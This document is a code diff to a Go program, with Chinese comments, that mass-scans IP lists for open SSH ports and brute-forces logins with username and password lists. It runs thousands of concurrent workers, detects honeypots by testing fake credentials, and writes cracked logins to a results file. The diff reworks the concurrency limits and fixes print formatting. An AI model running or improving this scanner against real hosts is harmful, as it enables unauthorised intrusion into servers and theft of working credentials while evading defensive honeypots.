@@ -16,16 +16,16 @@ import (
 )
 
 const (
-	port                  = "22"
-	timeout               = 1 * time.Second
-	ipFilename            = "ip.txt"
-	userFile              = "user.txt"
-	passFile              = "passwd.txt"
-	resultFile            = "success.txt"
-	scanWorkers           = 10000
-	authWorkers           = 10000
-	authWorkersPerIP      = 50
-	honeypotTestRounds    = 3
+	port               = "22"
+	timeout            = 1 * time.Second
+	ipFilename         = "ip.txt"
+	userFile           = "user.txt"
+	passFile           = "passwd.txt"
+	resultFile         = "success.txt"
+	scanWorkers        = 10000
+	maxConcurrentIPs   = 1000   // 限制同時處理的 IP 數量
+	authWorkersPerIP   = 50     // 每個 IP 的並行認證線程
+	honeypotTestRounds = 3
 )
 
 func init() {
@@ -45,25 +45,34 @@ func main() {
 		return
 	}
 
+	// 讀取並展開 IP 列表
 	ipChan := readIPFile(ipFilename)
 	openIPs := make(chan string, 1000)
 	success := make(chan string, 1000)
 
-	var scanWg, authWg sync.WaitGroup
-
-	// 啟動掃描工作池
+	var scanWg sync.WaitGroup
+	// 掃描端口
 	go func() {
 		startScanPool(ipChan, openIPs, &scanWg)
 		scanWg.Wait()
 		close(openIPs)
 	}()
 
-	// 啟動認證工作池
-	go func() {
-		startAuthPool(openIPs, users, passwords, success, &authWg)
-		authWg.Wait()
-		close(success)
-	}()
+	// 認證處理：對每個開放 IP 限制 maxConcurrentIPs 同時處理
+	var authWg sync.WaitGroup
+	sem := make(chan struct{}, maxConcurrentIPs)
+	for ip := range openIPs {
+		sem <- struct{}{}
+		authWg.Add(1)
+		go func(ip string) {
+			defer authWg.Done()
+			loginSSHConcurrent(ip, users, passwords, success)
+			<-sem
+		}(ip)
+	}
+	// 等待所有認證任務完成
+	authWg.Wait()
+	close(success)
 
 	// 處理成功結果
 	out, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -81,6 +90,7 @@ func main() {
 	fmt.Println("掃描結束")
 }
 
+// startScanPool 保持不變，用於並行掃描端口
 func startScanPool(ipChan <-chan string, openIPs chan<- string, wg *sync.WaitGroup) {
 	for i := 0; i < scanWorkers; i++ {
 		wg.Add(1)
@@ -97,23 +107,7 @@ func startScanPool(ipChan <-chan string, openIPs chan<- string, wg *sync.WaitGro
 	}
 }
 
-func startAuthPool(openIPs <-chan string, users, passwords []string, success chan<- string, wg *sync.WaitGroup) {
-	for i := 0; i < authWorkers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for ip := range openIPs {
-				if loginSSHConcurrent(ip, users, passwords, success) {
-					// 目標IP已處理，繼續下一IP
-					continue
-				}
-			}
-		}()
-	}
-}
-
-// loginSSHConcurrent 對單個 IP 使用多線程嘗試所有帳密組合，
-// 第一個成功後取消其餘任務，並進行蜜罐檢測。
+// loginSSHConcurrent 保持不變：對單 IP 使用多線程認證並蜜罐檢測
 func loginSSHConcurrent(ip string, users, passwords []string, success chan<- string) bool {
 	type cred struct{ user, pass string }
 	tasks := make(chan cred)
@@ -122,7 +116,7 @@ func loginSSHConcurrent(ip string, users, passwords []string, success chan<- str
 	var successOnce sync.Once
 	var found bool
 
-	// 啟動 per-IP 認證工作池
+	// 啟動 per-IP 認證線程
 	for i := 0; i < authWorkersPerIP; i++ {
 		wg.Add(1)
 		go func() {
@@ -149,9 +143,9 @@ func loginSSHConcurrent(ip string, users, passwords []string, success chan<- str
 								}
 								if trySSHLogin(ip, fakeUser, fakePass) {
 									honeypotCount++
-									fmt.Printf("[!] %s 測試 %d/\u003d3 錯誤登入成功 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
+									fmt.Printf("[!] %s 測試 %d/3 錯誤登入成功 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
 								} else {
-									fmt.Printf("[-] %s 測試 %d/\u003d3 錯誤登入被拒 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
+									fmt.Printf("[-] %s 測試 %d/3 錯誤登入被拒 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
 								}
 							}
 							successMsg := fmt.Sprintf("%s@%s 密碼: %s", task.user, ip, task.pass)
@@ -160,7 +154,6 @@ func loginSSHConcurrent(ip string, users, passwords []string, success chan<- str
 							}
 							fmt.Printf("[+] %s 登錄成功 (%s/%s)\n", ip, task.user, task.pass)
 							success <- successMsg
-							// 取消其餘嘗試
 							cancel()
 						})
 						return
@@ -172,7 +165,7 @@ func loginSSHConcurrent(ip string, users, passwords []string, success chan<- str
 		}()
 	}
 
-	// 分配任務
+	// 分配認證任務
 	go func() {
 		defer close(tasks)
 		for _, u := range users {
@@ -180,8 +173,7 @@ func loginSSHConcurrent(ip string, users, passwords []string, success chan<- str
 				select {
 				case <-ctx.Done():
 					return
-				default:
-					tasks <- cred{u, p}
+				case tasks <- cred{u, p}:
 				}
 			}
 		}
@@ -214,6 +206,7 @@ func trySSHLogin(ip, user, pass string) bool {
 	return true
 }
 
+// isOpen 保持不變
 func isOpen(ip, port string) bool {
 	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
 	if err != nil {
@@ -223,6 +216,7 @@ func isOpen(ip, port string) bool {
 	return true
 }
 
+// readLines 與 readIPFile 保持不變
 func readLines(filename string) ([]string, error) {
 	f, err := os.Open(filename)
 	if err != nil {
